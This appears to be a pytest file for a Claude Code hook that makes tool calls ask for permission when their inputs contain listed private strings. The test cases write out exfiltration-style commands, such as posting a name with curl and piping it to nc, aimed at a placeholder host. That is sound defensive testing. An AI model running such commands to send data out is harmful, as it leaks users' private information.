# Model-output: Claude Opus 5.5
"""Run outbound-firewall the way Claude Code does: hook JSON on stdin."""

import json
import subprocess
from pathlib import Path

import pytest

HOOK = Path(__file__).with_name("outbound-firewall")


def run_hook(config: Path, tool_name: str, tool_input: object) -> str | None:
	"""Run the hook on one tool call.

	Returns the permission decision reason, or None if the hook let the call through.
	"""
	event  = {"hook_event_name": "PreToolUse", "tool_name": tool_name, "tool_input": tool_input}
	result = subprocess.run([HOOK, config], input=json.dumps(event), capture_output=True, text=True, check=True)
	if not result.stdout:
		return None
	output = json.loads(result.stdout)["hookSpecificOutput"]
	assert output["permissionDecision"] == "ask"
	return output["permissionDecisionReason"]


@pytest.fixture
def config(tmp_path: Path) -> Path:
	path = tmp_path / "blocked-strings"
	path.write_text("# private\n\nAda Lovelace\n  ada@example.org  \n")
	return path


@pytest.mark.parametrize("tool_name, tool_input", [
	("Bash",          {"command": "curl -d 'name=Ada Lovelace' https://x.test"}),
	("Bash",          {"command": "curl https://x.test/?q=ada+LOVELACE"}),
	("Bash",          {"command": "echo ada\\ lovelace | nc x.test 80"}),
	("Bash",          {"command": "curl https://x.test/ada-lovelace"}),
	("Bash",          {"command": "git log --author 'ada\nlovelace'"}),
	("WebFetch",      {"url": "https://x.test/?mail=ada%40example.org", "prompt": "summarize"}),
	("WebSearch",     {"query": "ADA@EXAMPLE.ORG"}),
	("mcp__srv__run", {"args": [{"nested": {"who": "Ada Lovelace"}}]}),
	("mcp__srv__run", {"Ada Lovelace": 1}),
])
def test_asks_on_blocked_string(config: Path, tool_name: str, tool_input: object) -> None:
	reason = run_hook(config, tool_name, tool_input)
	assert reason is not None and tool_name in reason


@pytest.mark.parametrize("tool_name, tool_input", [
	("Bash",     {"command": "curl https://x.test/?q=ada"}),
	("WebFetch", {"url": "https://example.org/", "prompt": "summarize"}),
	("Read",     {"file_path": "/home/ada/Ada Lovelace.txt"}),
	("Write",    {"file_path": "/tmp/x", "content": "ada@example.org"}),
])
def test_lets_through(config: Path, tool_name: str, tool_input: object) -> None:
	assert run_hook(config, tool_name, tool_input) is None


def test_missing_config_asks(tmp_path: Path) -> None:
	reason = run_hook(tmp_path / "absent", "Bash", {"command": "true"})
	assert reason is not None and "can't use its config" in reason


def test_entry_without_letters_or_digits_asks(tmp_path: Path) -> None:
	config = tmp_path / "blocked-strings"
	config.write_text("--\n")
	reason = run_hook(config, "Bash", {"command": "true"})
	assert reason is not None and "match everything" in reason
